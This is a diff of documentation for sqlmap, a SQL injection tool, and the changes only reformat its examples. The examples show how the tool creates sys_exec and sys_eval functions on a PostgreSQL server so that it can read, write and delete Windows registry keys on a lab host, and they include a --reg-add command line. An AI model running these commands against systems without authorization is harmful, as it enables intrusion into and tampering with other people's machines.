@@ -5295,12 +5295,13 @@ back-end DBMS: PostgreSQL
 [hh:mm:24] [INFO] retrieved: 0
 [hh:mm:25] [INFO] creating UDF 'sys_eval' from the binary UDF file
 [hh:mm:25] [INFO] creating UDF 'sys_exec' from the binary UDF file
-which registry key do you want to read? [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion]
+which registry key do you want to read? [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\
+CurrentVersion]
 which registry key value do you want to read? [ProductName]
-[hh:mm:34] [INFO] reading Windows registry path 'HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductName'
+[hh:mm:34] [INFO] reading Windows registry path 'HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\
+Windows NT\CurrentVersion\ProductName'
 [hh:mm:35] [INFO] retrieved: ProductName        REG_SZ  Microsoft Windows XP
 Registry key value data:    'ProductName        REG_SZ  Microsoft Windows XP'
-[...]
 </verb></tscreen>
 
 <sect2>Write a Windows registry key value
@@ -5338,10 +5339,9 @@ which registry key do you want to write? HKEY_LOCAL_MACHINE\SOFTWARE\sqlmap
 which registry key value do you want to write? Test
 which registry key value data do you want to write? 1
 which registry key value data-type is it? [REG_SZ] REG_DWORD
-[hh:mm:41] [INFO] adding Windows registry path 'HKEY_LOCAL_MACHINE\SOFTWARE\sqlmap\Test' with data '1'. This will 
-work only if the user running the database process has privileges to modify the Windows registry.
-
-[*] shutting down at: hh:mm:42
+[hh:mm:41] [INFO] adding Windows registry path 'HKEY_LOCAL_MACHINE\SOFTWARE\sqlmap\Test'
+with data '1'. This will work only if the user running the database process has privileges
+to modify the Windows registry.
 </verb></tscreen>
 
 <sect2>Delete a Windows registry key
@@ -5377,17 +5377,18 @@ back-end DBMS: PostgreSQL
 [hh:mm:06] [INFO] creating UDF 'sys_exec' from the binary UDF file
 which registry key do you want to delete? HKEY_LOCAL_MACHINE\SOFTWARE\sqlmap
 which registry key value do you want to delete? Test
-are you sure that you want to delete the Windows registry path 'HKEY_LOCAL_MACHINE\SOFTWARE\sqlmap\Test? [y/N] y
-[hh:mm:26] [INFO] deleting Windows registry path 'HKEY_LOCAL_MACHINE\SOFTWARE\sqlmap\Test'. This will work only 
-if the user running the database process has privileges to modify the Windows registry.
-
-[*] shutting down at: hh:mm:27
+are you sure that you want to delete the Windows registry path 'HKEY_LOCAL_MACHINE\SOFTWARE\
+sqlmap\Test? [y/N] y
+[hh:mm:26] [INFO] deleting Windows registry path 'HKEY_LOCAL_MACHINE\SOFTWARE\sqlmap\Test'. 
+This will work only if the user running the database process has privileges to modify the 
+Windows registry.
 </verb></tscreen>
+
 
 <sect2>Auxiliary registry switches
 
 <p>
-Option: <tt>-</tt><tt>-reg-key</tt>, <tt>-</tt><tt>-reg-value</tt>, 
+Options: <tt>-</tt><tt>-reg-key</tt>, <tt>-</tt><tt>-reg-value</tt>, 
 <tt>-</tt><tt>-reg-data</tt> and <tt>-</tt><tt>-reg-type</tt>
 
 <p>
@@ -5409,7 +5410,7 @@ So, another way of running example from option
 <tt>-</tt><tt>-reg-add</tt> could be:
 
 <tscreen><verb>
-$ python sqlmap.py -u http://172.16.213.128/sqlmap/pgsql/get_int.php?id=1 --reg-add\ 
+$ python sqlmap.py -u http://172.16.213.128/sqlmap/pgsql/get_int.php?id=1 --reg-add \ 
   --reg-key=HKEY_LOCAL_MACHINE\SOFTWARE\sqlmap --reg-value=Test --reg-type=REG_SZ --reg-data=1
 </verb></tscreen>
 
